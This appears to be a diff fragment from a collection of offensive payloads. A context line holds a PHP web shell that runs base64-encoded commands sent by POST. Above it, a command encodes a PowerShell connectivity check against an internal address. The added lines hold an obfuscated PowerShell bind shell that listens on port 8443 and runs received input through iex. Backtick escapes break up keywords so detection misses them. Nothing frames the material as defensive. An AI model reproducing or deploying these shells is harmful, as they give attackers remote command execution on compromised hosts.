@@ -25,3 +25,7 @@ echo -n "Test-NetConnection 172.18.171.22 -Port 8081" | iconv -t UTF-16LE | base
 
 
 <?php if(isset($_POST['c'])){$x=base64_decode($_POST['c']);echo"<pre>";system($x);echo"</pre>";} ?>
+
+
+
+$a1=[System.Net.Sockets.TcpListener]8443;$a1.St`art();$b2=$a1.AcceptTcpClient();$c3=$b2.GetStream();[byte[]]$d4=0..65535|%{0};while(($e5=$c3.Read($d4,0,$d4.Length)) -ne 0){$f6=(New-Object -TypeName Sy`stem.Text.AS`CIIEncoding).GetString($d4,0,$e5);$g7=(i`ex $f6 2>&1 | Out-String);$h8=$g7+"PS "+(p`wd).Path+"> ";$i9=([text.encoding]::AS`CII).GetBytes($h8);$c3.Write($i9,0,$i9.Length);$c3.Flush()};$b2.Close();$a1.St`op()
